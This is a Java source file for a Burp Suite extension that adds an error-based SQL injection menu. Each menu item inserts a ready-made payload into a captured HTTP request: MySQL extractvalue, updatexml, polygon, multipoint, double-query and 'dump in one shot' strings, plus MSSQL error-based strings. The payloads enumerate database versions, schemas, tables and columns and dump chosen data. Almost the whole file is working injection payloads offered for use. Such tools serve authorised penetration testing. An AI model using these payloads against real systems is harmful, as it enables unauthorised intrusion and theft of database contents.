/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package hackbar;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.math.BigInteger;
import java.util.Arrays;
import javax.swing.JMenu;

import burp.BurpExtender;
import burp.IHttpRequestResponse;
import burp.Methods;

/**
 *
 * @author abdul.wahab
 */
public class SQL_Error extends JMenu {
    public BurpExtender myburp;
    public String[] SQL_Error_Menu = {"Error Based", "XPATH EXTRACTVALUE", "XPATH UPDATEXML", "POLYGON / MULTIPIONT", "MULTIPIONT DIOS", "Advance Error Based(MySQL >= 5.5)", "DIOS By MadBlood(MySQL >= 5.5)", "Double Query Based", "MSSQL ERRORBASED"};
    public String SQL_Error_MenuItem[][] = {
        {"Get Version", "Get Databases", "Get Tables", "Get Columns", "Get Data"},
        {"EV-Get Version", "EV-Get Databases", "EV-Get Tables", "EV-Get Columns", "EV-Get Data"},
        {"UX-Get Version", "UX-Get Databases", "UX-Get Tables", "UX-Get Columns", "UX-Get Data"},
        {"POL-Get Version", "POL-Get Tables"},
        {"M-DIOS 1", "M-DIOS 2", "M-DIOS 3", "M-DIOS 4"},
        {"AEB-Get Version", "AEB-Get Tables"},
        {"DIOS 1", "DIOS 2", "DIOS 3", "DIOS 4", "DIOS 5", "DIOS 6", "DIOS 7", "DIOS 8", "DIOS 9"},
        {"DQ-Get Version", "DQ-Get Database", "DQ-Get Tables", "DQ-Get Columns", "DQ-Get Data"},
        {"MS-Get Version", "MS-Get Database", "MS-Get User", "MSSQL DIOS"}
    };
    
    public SQL_Error(BurpExtender burp){
        this.setText("SQLi:Error Based");
        this.myburp = burp;
        Methods.Create_Main_Menu(this, SQL_Error_Menu, SQL_Error_MenuItem, new SQLErrorItemListener(this.myburp));
    }
}


class SQLErrorItemListener implements ActionListener {

    BurpExtender myburp;
    SQLErrorItemListener(BurpExtender burp) {
        myburp = burp;
    }
    
    @Override
    public void actionPerformed(ActionEvent e) {
        int[] selectedIndex = myburp.context.getSelectionBounds();
        IHttpRequestResponse req = myburp.context.getSelectedMessages()[0];
        byte[] request = req.getRequest();

        String action = e.getActionCommand();
        byte[] newRequest = GetNewRequest(request, selectedIndex, action);
        req.setRequest(newRequest);
    }
    
    public byte[] GetNewRequest(byte[] request,int[] selectedIndex, String action){
        String database, table, columns;
        String selectedString =null;
		switch(action){
            case "Get Version":
                selectedString  = "+OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1";
                break;
            case "Get Databases":
                selectedString = "+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";
                break;
            case "Get Tables":
                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                if (!database.toLowerCase().equals("database()")){ database = "0x" + String.format("%x", new BigInteger(1, database.getBytes()));}
                selectedString = "+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=" + database + "+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";
                break;
            case "Get Columns":
                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                if (!database.toLowerCase().equals("database()")){ database = "0x" + String.format("%x", new BigInteger(1, database.getBytes()));}
                table = Methods.prompt_and_validate_input("Enter Table Name", null);
                table = "0x" + String.format("%x", new BigInteger(1, table.getBytes()));
                selectedString = "+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=" + table + "+AND+table_schema=" + database + "+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";
                break;
            case "Get Data":
                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                table = Methods.prompt_and_validate_input("Enter Table Name", null);
                columns = Methods.prompt_and_validate_input("Enter Column to dump", null).replace(' ', '+');
                if (!database.toLowerCase().equals("database()")){ table = database+"."+table;}
                selectedString = "+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(" + columns + ")+AS+CHAR),0x7e))+FROM+" + table + "+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";
                break;            
            // ----------------------------------------------------------------------------
            case "EV-Get Version":
                selectedString = "+and+extractvalue(0x0a,concat(0x0a,(select+version())))";
                break;
            case "EV-Get Databases":
                selectedString = "+and+extractvalue(0x0a,concat(0x0a,(SELECT+schema_name+FROM+INFORMATION_SCHEMA.SCHEMATA+limit+0,1)))";
                break;
            case "EV-Get Tables":
                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                if (!database.toLowerCase().equals("database()")){ database = "0x" + String.format("%x", new BigInteger(1, database.getBytes()));}
                selectedString = "+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=" + database + "+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";
                break;
            case "EV-Get Columns":
                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                if (!database.toLowerCase().equals("database()")){ database = "0x" + String.format("%x", new BigInteger(1, database.getBytes()));}
                table = Methods.prompt_and_validate_input("Enter Table Name", null);
                table = "0x" + String.format("%x", new BigInteger(1, table.getBytes()));
                selectedString = "+and+extractvalue(0x0a,concat(0x0a,(select+column_name+from+information_schema.columns+where+table_schema=" + database + "+and+table_name=" + table + "+limit+0,1)))";
                break;
            case "EV-Get Data":
                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                table = Methods.prompt_and_validate_input("Enter Table Name", null);
                columns = Methods.prompt_and_validate_input("Enter Column to dump", null).replace(' ', '+');
                if (!database.toLowerCase().equals("database()")){ table = database+"."+table;}
                selectedString = "+and+extractvalue(0x0a,concat(0x0a,(select+concat(" + columns + ")+from+" + table + "+limit+0,1)))";
                break;
            // ----------------------------------------------------------------------------   
            case "UX-Get Version":
                selectedString = "+and+updatexml(null,concat(0x0a,(select+version())),null)";
                break;
            case "UX-Get Databases":
                selectedString = "+and+updatexml(null,concat(0x0a,(SELECT+schema_name+FROM+INFORMATION_SCHEMA.SCHEMATA+limit+0,1)),null)";
                break;
            case "UX-Get Tables":
                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                if (!database.toLowerCase().equals("database()")){ database = "0x" + String.format("%x", new BigInteger(1, database.getBytes()));}
                selectedString = "+and+updatexml(null,concat(0x0a,(select+table_name+from+information_schema.tables+where+table_schema=" + database + "+limit+0,1)),null)";
                break;
            case "UX-Get Columns":
                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                if (!database.toLowerCase().equals("database()")){ database = "0x" + String.format("%x", new BigInteger(1, database.getBytes()));}
                table = Methods.prompt_and_validate_input("Enter Table Name", null);
                table = "0x" + String.format("%x", new BigInteger(1, table.getBytes()));
                selectedString = "+and+updatexml(null,concat(0x0a,(select+column_name+from+information_schema.columns+where+table_schema=" + database + "+and+table_name=" + table + "+limit+0,1)),null)";
                break;
            case "UX-Get Data":
                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                table = Methods.prompt_and_validate_input("Enter Table Name", null);
                columns = Methods.prompt_and_validate_input("Enter Column to dump", null).replace(' ', '+');
                if (!database.toLowerCase().equals("database()")){ table = database+"."+table;}
                selectedString = "+and+updatexml(null,concat(0x0a,(select+concat(" + columns + ")+from+" + table + "+limit+0,1)),null)";
                break;
            // ----------------------------------------------------------------------------
            case "POL-Get Version":
                selectedString = "+POLYGON((Select*from(Select*from(Select+@@version+``)y)x))";
                break;
            case "POL-Get Tables":
                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                if (!database.toLowerCase().equals("database()")){ database = "0x" + String.format("%x", new BigInteger(1, database.getBytes()));}
                selectedString = "+POLYGON((select*from(select*from(select+group_concat(table_name+separator+0x3c62723e)+from+information_schema.tables+where+table_schema=" + database + ")f)x))";
                break;
            // ----------------------------------------------------------------------------
            case "M-DIOS 1":
                selectedString = "+multipoint((select*from+(select+x*1E308+from+(select+concat(@:=0,(select+count(*)+from+information_schema.tables+where+table_schema=database()+and@:=concat(@,0x0b,table_name)),@)x)y)j))";
                break;
            case "M-DIOS 2":
                selectedString = "+multipoint((select*from(select(!x-~0)+from(select+concat(@:=0,(select(count(*))from(information_schema.tables)where(table_schema=database())and@:=concat(@,0x0b,table_name)),@)x)y)j))";
                break;
            case "M-DIOS 3":
                selectedString = "+multipoint((select*from(select(x+is+not+null)-9223372036854775808+from+(select(concat(@:=0,(select+count(*)+from+information_schema.tables+where+table_schema=database()+and@:=concat(@,0x0b,table_name)),@))x)y)j))";
                break;
            case "M-DIOS 4":
                selectedString = "'+and+multipoint((select*from(select!x-~0.from(select(select+group_concat(table_name+separator+0x0b)from(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1,20)c)x)j)h))";
                break;
            // ----------------------------------------------------------------------------
            case "AEB-Get Version":
                selectedString = "and(select!x-~0.+from(select(select+group_concat(Version()))x)x)";
                break;
            case "AEB-Get Tables":
                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                if (!database.toLowerCase().equals("database()")){ database = "0x" + String.format("%x", new BigInteger(1, database.getBytes()));}
                selectedString = "and(select!x-~0.+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=" + database + ")x)x)";
                break;
            // ----------------------------------------------------------------------------
            case "DIOS 1":
                selectedString = "(select+x*1E308+from(select+concat(@:=0,(select+count(*)from+information_schema.tables+where+table_schema=database()and@:=concat(@,0x0b,table_name)),@)x)y)";
                break;
            case "DIOS 2":
                selectedString = "(select(x+is+not+null)-9223372036854775808+from(select(concat(@:=0,(select+count(*)from+information_schema.tables+where+table_schema=database()and@:=concat(@,0x0b,table_name)),@))x)y)";
                break;
            case "DIOS 3":
                selectedString = "(select!x-~0+from(select+concat(@:=0,(select(count(*))from(information_schema.tables)where(table_schema=database())and@:=concat(@,0x0b,table_name)),@)x)y)";
                break;
            case "DIOS 4":
                selectedString = "(select+if(x,6,9)*1E308+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)";
                break;
            case "DIOS 5":
                selectedString = "(select!x-~0.+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)";
                break;
            case "DIOS 6":
                selectedString = "(select(!root-~0)from(select concat/**/(user(),version(),database(),0x3c62723e,@:=0,(select+count(*)+from+information_schema.columns where table_schema=database() and @:=concat/**/(@,table_name,0x3a3a3a3a3a,column_name,0x3c62723e)),@)root)z)";
                break;
            case "DIOS 7":
                selectedString = "and(select(!root-~0)from(select concat/**/(user(),version(),database(),0x3c62723e,@:=0,(select+count(*)+from+information_schema.columns where table_schema=database() and @:=concat/**/(@,table_name,0x3a3a3a3a3a,column_name,0x3c62723e)),@)root)z)";
                break;
            case "DIOS 8":
                selectedString = "and(select+if(x,6,9)*1E308+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)";
                break;
            case "DIOS 9":
                selectedString = "and(select+x*1E308+from(select+concat(@:=0,(select+count(*)from+information_schema.tables+where+table_schema=database()+and@:=concat(@,0x0b,table_name)),@)x)y)";
                break;
            // ----------------------------------------------------------------------------
            case "DQ-Get Version":
                selectedString = "+AND(SELECT+1+FROM(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+CONCAT(CAST(VERSION()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
                break;
            case "DQ-Get Databases":
                selectedString = "+AND(SELECT+1+from(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+DISTINCT+CONCAT(0x7e,0x27,CAST(schema_name+AS+CHAR),0x27,0x7e)+FROM+INFORMATION_SCHEMA.SCHEMATA+WHERE+table_schema!=DATABASE()+LIMIT+1,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),+FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
                break;
            case "DQ-Get Tables":
                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                if (!database.toLowerCase().equals("database()")){ database = "0x" + String.format("%x", new BigInteger(1, database.getBytes()));}
                selectedString = "+AND(SELECT+1+from(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+DISTINCT+CONCAT(0x7e,0x27,CAST(table_name+AS+CHAR),0x27,0x7e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=" + database + "+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
                break;
            case "DQ-Get Columns":
                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                if (!database.toLowerCase().equals("database()")){ database = "0x" + String.format("%x", new BigInteger(1, database.getBytes()));}
                table = Methods.prompt_and_validate_input("Enter Table Name", null);
                table = "0x" + String.format("%x", new BigInteger(1, table.getBytes()));
                selectedString = "+AND(SELECT+1+FROM(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+DISTINCT+CONCAT(0x7e,0x27,CAST(column_name+AS+CHAR),0x27,0x7e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_schema=" + database + "+AND+table_name=" + table + "+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
                break;
            case "DQ-Get Data":
                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                table = Methods.prompt_and_validate_input("Enter Table Name", null);
                columns = Methods.prompt_and_validate_input("Enter Column to dump", null).replace(' ', '+');
                if (!database.toLowerCase().equals("database()")){ table = database+"."+table;}
                selectedString = "+AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+CONCAT(0x7e,0x27,cast(" + columns + "+AS+CHAR),0x27,0x7e)+FROM+" + table + "+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
                break;
            // ----------------------------------------------------------------------------
            case "MS-Get Version":
                selectedString = "and 1=@@version()";
                break;
            case "MS-Get Database":
                selectedString = "and 1=db_name()";
                break;
            case "MS-Get User":
                selectedString = "and 1=user";
                break;
            case "MSSQL DIOS":
                selectedString = "and 1=(select+table_name%2b'::'%2bcolumn_name as t+from+information_schema.columns FOR XML PATH(''))";
                break;

                
            default:
                break;
        }
        if (selectedString!=null){//caution the difference of equals and ==
        	return Methods.do_modify_request(request, selectedIndex, selectedString.getBytes());
        }else {
        	return request;
        }
    }
    

}